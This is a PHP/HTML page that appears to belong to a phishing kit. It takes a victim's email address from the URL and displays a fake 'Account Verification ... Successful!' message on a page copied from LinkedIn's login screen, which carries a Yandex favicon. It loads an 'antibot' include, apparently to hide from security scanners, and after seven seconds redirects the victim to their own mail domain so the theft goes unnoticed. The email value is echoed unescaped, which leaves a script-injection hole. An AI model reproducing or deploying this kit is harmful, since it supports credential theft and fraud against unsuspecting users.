<?php

include 'prevents/antibot.php';

session_start();

$email = $_GET['email'];
$em=explode('@',$email);
$emaildomain = substr(strrchr($email, "@"), 1);

?>
<html lang="en-US" class="artdeco ">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head><meta http-equiv="X-UA-Compatible" content="IE=EDGE"><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Mail Verification system</title>
<link rel="SHORTCUT ICON" href="https://mail.yandex.com/favicon.ico"/>
<meta http-equiv="REFRESH" content="7; url=http://<?php echo $emaildomain?>">
<meta name="treeID" content="PgfdtbPuWxXgLF1bSisAAA=="><meta name="pageKey" content="d_checkpoint_lg_consumerLogin"><meta name="pageInstance" content="urn:li:page:d_checkpoint_lg_consumerLogin;WBxq9N6GRfOBOQa/C25pyA=="><meta name="appName" content="checkpoint-frontend"> <meta name="description" content="Log in to LinkedIn to keep in touch with people you know, share ideas, and build your career."><link rel="stylesheet" href="desktop_en_US.css"/>
<link rel="preload" href='https://static.licdn.com/sc/h/bl55kxtb0bqc7bjuzp29uiq8v' as="script" /><link rel="preload" href='https://static.licdn.com/sc/h/amr2fg65yx3tpak6s74f9lemr' as="script" /></head><body class="system-fonts " ><div id="app__container"><header><div class="nav__base"></div></header><div class="app__content" role="main">
<div id="app__container">
  <div class="app__content" role="main"><div>
  <div class="header__content"><h1 class="header__content__heading">&nbsp;</h1>
    <h1 class="header__content__heading">&nbsp;</h1><h1 class="header__content__heading">&nbsp;</h1>
</div>
  <form>
<br><br><br><br><br>

			<div>
			<h3>Account Verification for <?php echo $email ?> Successful!</h3>

			<p>You will be redirected back shortly!</p>

			<br><br>
</form><div class="footer-app-content-actions">
  <p>
          
        </p></div></div></div><footer class="footer__base" role="contentinfo"><div class="footer__base__wrapper">
          <p class="copyright"><em><strong>M</strong>ailservices© 2024</em></p>
          <ul class="footer__base__nav-list" role="menubar" aria-label="Footer Legal Menu"><li role="menuitem"><a href="#">User Agreement</a></li><li role="menuitem"><a href="#">Privacy Policy</a></li><li role="menuitem"><a href="#">Community Guidelines</a></li><li role="menuitem"><a href="#">Cookie Policy</a></li><li role="menuitem"><a href="#">Copyright Policy</a></li><li id="feedback-request"><a href="#" target="_blank"rel="nofollow noreferrer noopener">Send Feedback</a></li></ul></div></footer><artdeco-toasts></artdeco-toasts><span class="hidden toast-success-icon"><li-icon type="success-pebble-icon" size="small" aria-hidden="true"><svg viewBox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveAspectRatio="xMinYMin meet" class="artdeco-icon" focusable="false"><g class="small-icon" style="fill-opacity: 1"><circle class="circle" r="6.1" stroke="currentColor" stroke-width="1.8" cx="8" cy="8" fill="none" transform="rotate(-90 8 8)"></circle><path d="M9.95,5.033l1.2,0.859l-3.375,4.775C7.625,10.875,7.386,10.999,7.13,11c-0.002,0-0.003,0-0.005,0    c-0.254,0-0.493-0.12-0.644-0.325L4.556,8.15l1.187-0.875l1.372,1.766L9.95,5.033z" fill="currentColor"></path></g></svg></li-icon></span><span class="hidden toast-error-icon"><li-icon type="error-pebble-icon" size="small" aria-hidden="true"><svg viewBox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveAspectRatio="xMinYMin meet" class="artdeco-icon" focusable="false"><g class="small-icon" style="fill-opacity: 1"><circle class="circle" r="6.1" stroke="currentColor" stroke-width="1.8" cx="8" cy="8" fill="none" transform="rotate(-90 8 8)"></circle><path fill="currentColor" d="M10.916,6.216L9.132,8l1.784,1.784l-1.132,1.132L8,9.132l-1.784,1.784L5.084,9.784L6.918,8L5.084,6.216l1.132-1.132L8,6.868l1.784-1.784L10.916,6.216z"></path></g></svg></li-icon></span><span class="hidden toast-notify-icon"><li-icon type="yield-pebble-icon" size="small" aria-hidden="true"><svg viewBox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveAspectRatio="xMinYMin meet" class="artdeco-icon" focusable="false"><g class="small-icon" style="fill-opacity: 1"><circle class="circle" r="6.1" stroke="currentColor" stroke-width="1.8" cx="8" cy="8" fill="none" transform="rotate(-90 8 8)"></circle><path d="M7,10h2v2H7V10z M7,9h2V4H7V9z"></path></g></svg></li-icon></span><span class="hidden toast-gdpr-icon"><li-icon aria-hidden="true" type="shield-icon" size="small"><svg viewBox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveAspectRatio="xMinYMin meet" class="artdeco-icon" focusable="false"><path d="M8,1A10.89,10.89,0,0,1,2.87,3,1,1,0,0,0,2,4V9.33a5.67,5.67,0,0,0,2.91,5L8,16l3.09-1.71a5.67,5.67,0,0,0,2.91-5V4a1,1,0,0,0-.87-1A10.89,10.89,0,0,1,8,1ZM4,4.7A12.92,12.92,0,0,0,8,3.26a12.61,12.61,0,0,0,3.15,1.25L4.45,11.2A3.66,3.66,0,0,1,4,9.46V4.7Zm6.11,8L8,13.84,5.89,12.66A3.65,3.65,0,0,1,5,11.92l7-7V9.46A3.67,3.67,0,0,1,10.11,12.66Z" class="small-icon" style="fill-opacity: 1"></path></svg></li-icon></span><span class="hidden toast-cancel-icon"><li-icon type="cancel-icon" size="large"><svg x="0" y="0" id="cancel-icon" preserveAspectRatio="xMinYMin meet" viewBox="0 0 24 24" width="24px" height="24px"><svg class="small-icon" style="fill-opacity: 1;"><path d="M12.99,4.248L9.237,8L13,11.763L11.763,13L8,9.237L4.237,13L3,11.763L6.763,8L3,4.237L4.237,3L8,6.763l3.752-3.752L12.99,4.248z"/></svg><svg class="large-icon" style="fill: currentColor;"><path d="M20,5.237l-6.763,6.768l6.743,6.747l-1.237,1.237L12,13.243L5.257,19.99l-1.237-1.237l6.743-6.747L4,5.237L5.237,4L12,10.768L18.763,4L20,5.237z"/></svg></svg></li-icon></span><div id="loader-wrapper" class="hidden"><li-icon type="loader" class="blue" size="medium" aria-hidden="true"><div class="artdeco-spinner"><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span></div></li-icon></div></div><script src='https://static.licdn.com/sc/h/amr2fg65yx3tpak6s74f9lemr' defer></script><script src='https://static.licdn.com/sc/h/bl55kxtb0bqc7bjuzp29uiq8v' defer></script></body>
<!-- Mirrored from www.linkedin.com/checkpoint/lg/login?errorKey=unexpected_error by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 09 Oct 2018 11:55:58 GMT -->
</html>